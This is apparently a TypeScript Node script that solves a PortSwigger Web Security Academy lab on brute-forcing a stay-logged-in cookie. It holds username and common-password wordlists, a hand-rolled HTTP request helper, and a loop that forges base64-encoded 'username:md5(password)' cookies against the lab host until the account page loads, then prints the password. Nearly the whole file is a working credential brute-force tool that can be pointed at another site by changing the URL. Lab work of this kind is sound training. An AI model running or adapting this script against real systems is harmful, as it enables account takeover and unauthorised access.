/**
 * PortSwigger Lab: Brute-forcing a stay-logged-in cookie
 * https://portswigger.net/web-security/authentication/other-mechanismsx/lab-brute-forcing-a-stay-logged-in-cookie
 * 
 * Runs only in NodeJS
 */

;(async () => {
	// #region Constants
	const crypto = await import("crypto")
	const USERNAMES = [
		"carlos",
		"root",
		"admin",
		"test",
		"guest",
		"info",
		"adm",
		"mysql",
		"user",
		"administrator",
		"oracle",
		"ftp",
		"pi",
		"puppet",
		"ansible",
		"ec2-user",
		"vagrant",
		"azureuser",
		"academico",
		"acceso",
		"access",
		"accounting",
		"accounts",
		"acid",
		"activestat",
		"ad",
		"adam",
		"adkit",
		"admin",
		"administracion",
		"administrador",
		"administrator",
		"administrators",
		"admins",
		"ads",
		"adserver",
		"adsl",
		"ae",
		"af",
		"affiliate",
		"affiliates",
		"afiliados",
		"ag",
		"agenda",
		"agent",
		"ai",
		"aix",
		"ajax",
		"ak",
		"akamai",
		"al",
		"alabama",
		"alaska",
		"albuquerque",
		"alerts",
		"alpha",
		"alterwind",
		"am",
		"amarillo",
		"americas",
		"an",
		"anaheim",
		"analyzer",
		"announce",
		"announcements",
		"antivirus",
		"ao",
		"ap",
		"apache",
		"apollo",
		"app",
		"app01",
		"app1",
		"apple",
		"application",
		"applications",
		"apps",
		"appserver",
		"aq",
		"ar",
		"archie",
		"arcsight",
		"argentina",
		"arizona",
		"arkansas",
		"arlington",
		"as",
		"as400",
		"asia",
		"asterix",
		"at",
		"athena",
		"atlanta",
		"atlas",
		"att",
		"au",
		"auction",
		"austin",
		"auth",
		"auto",
		"autodiscover",
	] as const
	const PASSWORDS = [
		"123456",
		"password",
		"12345678",
		"qwerty",
		"123456789",
		"12345",
		"1234",
		"111111",
		"1234567",
		"dragon",
		"123123",
		"baseball",
		"abc123",
		"football",
		"monkey",
		"letmein",
		"shadow",
		"master",
		"666666",
		"qwertyuiop",
		"123321",
		"mustang",
		"1234567890",
		"michael",
		"654321",
		"superman",
		"1qaz2wsx",
		"7777777",
		"121212",
		"000000",
		"qazwsx",
		"123qwe",
		"killer",
		"trustno1",
		"jordan",
		"jennifer",
		"zxcvbnm",
		"asdfgh",
		"hunter",
		"buster",
		"soccer",
		"harley",
		"batman",
		"andrew",
		"tigger",
		"sunshine",
		"iloveyou",
		"2000",
		"charlie",
		"robert",
		"thomas",
		"hockey",
		"ranger",
		"daniel",
		"starwars",
		"klaster",
		"112233",
		"george",
		"computer",
		"michelle",
		"jessica",
		"pepper",
		"1111",
		"zxcvbn",
		"555555",
		"11111111",
		"131313",
		"freedom",
		"777777",
		"pass",
		"maggie",
		"159753",
		"aaaaaa",
		"ginger",
		"princess",
		"joshua",
		"cheese",
		"amanda",
		"summer",
		"love",
		"ashley",
		"nicole",
		"chelsea",
		"biteme",
		"matthew",
		"access",
		"yankees",
		"987654321",
		"dallas",
		"austin",
		"thunder",
		"taylor",
		"matrix",
		"mobilemail",
		"mom",
		"monitor",
		"monitoring",
		"montana",
		"moon",
		"moscow",
	] as const
	class Sess {
		history = [] as Res[]
		constructor(private cookies = [] as string[]) {}

		static async req(request: string) {
			return new Sess().req(request)
		}

		async req(request: string) {
			const lines = request.trim().split("\n")
			if (!lines.length) throw new Error("Empty request string!")

			const [method, url] = lines.shift()!.trim().split(" ")

			let i = 0
			const headers = {} as Record<string, string>
			for (; i < lines.length; i++) {
				const line = lines[i]!.trim()
				if (!line) break

				const [key, ...values] = line.split(":")
				headers[key!] = values.join(":").trim()
			}

			if ("Cookie" in headers) {
				headers.Cookie = [...this.cookies, headers.Cookie].join("; ")
			} else if ("cookie" in headers) {
				headers.cookie = [...this.cookies, headers.cookie].join("; ")
			} else {
				headers.Cookie = this.cookies.join("; ")
			}

			let body = lines
				.slice(++i)
				.map(l => l.trim())
				.join("\n")
				.trim()

			const req = await fetch(url!, {
				method,
				headers,
				body: method!.toLowerCase() === "get" ? undefined : body,
			})

			const res = new Res(req, await req.text())

			this.history.push(res)
			this.cookies.push(...res.cookies())

			return res
		}
	}
	class Res {
		constructor(
			private res: Response,
			private text: string,
		) {}

		get raw() {
			return this.res
		}

		status() {
			return this.res.status
		}

		headers() {
			return this.res.headers
		}

		header(key: string): string | string[] | undefined {
			return [...this.res.headers.entries()].find(
				([k]) => k.toLowerCase() === key.toLowerCase(),
			)?.[1]
		}

		cookies(): string[] {
			return [this.header("set-cookie")!].flat()?.map(c => c.split(";")[0]!) ?? []
		}

		body() {
			return this.text
		}

		bodreg(regexp: RegExp) {
			return this.text.match(regexp)?.slice(1)
		}
	}
	// #endregion

	console.clear()

	const iter = async (usnm: string, pswd: string) => {
		const r1 = await Sess.req(`
			GET https://0a5400c704a953308d07580b0085005b.web-security-academy.net/my-account?id=${usnm} HTTP/1.1
			Sec-GPC: 1
			Sec-Fetch-Site: same-origin
			Sec-Fetch-Mode: navigate
			Sec-Fetch-User: ?1
			Sec-Fetch-Dest: document
			sec-ch-ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"
			sec-ch-ua-mobile: ?0
			sec-ch-ua-platform: "macOS"
			Accept-Language: en-GB,en;q=0.5
			Referer: https://0a5400c704a953308d07580b0085005b.web-security-academy.net/login
			Cookie: stay-logged-in=${btoa(`${usnm}:${crypto.createHash("md5").update(pswd).digest("hex")}`)};
		`)

		return r1.body().includes("Update email")
	}

	for (const P of PASSWORDS) {
		if (await iter("carlos", P)) {
			console.log(P)
			break
		}
	}
})()
